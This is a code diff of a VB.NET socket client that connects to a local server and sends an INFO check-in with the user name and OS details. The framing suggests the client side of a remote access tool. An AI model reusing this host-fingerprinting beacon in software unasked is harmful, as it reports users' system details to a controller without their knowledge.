@@ -5,7 +5,7 @@ Imports System.IO
 Public Class ClientSocket
 
     Public Shared S As Socket
-    Public Shared Buffer(999999) As Byte
+    Public Shared Buffer(1024 * 2000) As Byte
     Public Shared MS As New MemoryStream
 
     Public Shared EOF As String = "<EOF>"
@@ -23,15 +23,13 @@ Public Class ClientSocket
             Dim ipAddress As IPAddress = IPAddress.Parse("127.0.0.1")
             Dim ipEndPoint As IPEndPoint = New IPEndPoint(ipAddress, 2020)
 
-            Buffer = New Byte(999999) {}
+            Buffer = New Byte(1024 * 2000) {}
             MS = New MemoryStream
 
             S.Connect(ipEndPoint)
 
             isConnected = True
-
-            Dim OS As New Devices.ComputerInfo
-            Send(String.Concat("INFO", SPL, Environment.UserName, SPL, OS.OSFullName))
+            Send(Info)
             BeginReceive()
 
             While isConnected
@@ -44,6 +42,13 @@ Public Class ClientSocket
         End Try
 
     End Sub
+
+    Private Shared Function Info()
+
+        Dim OS As New Devices.ComputerInfo
+        Return (String.Concat("INFO", SPL, Environment.UserName, SPL, OS.OSFullName, Environment.OSVersion.ServicePack, " ", Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit")))
+
+    End Function
 
     Private Shared Sub BeginReceive()
         Try
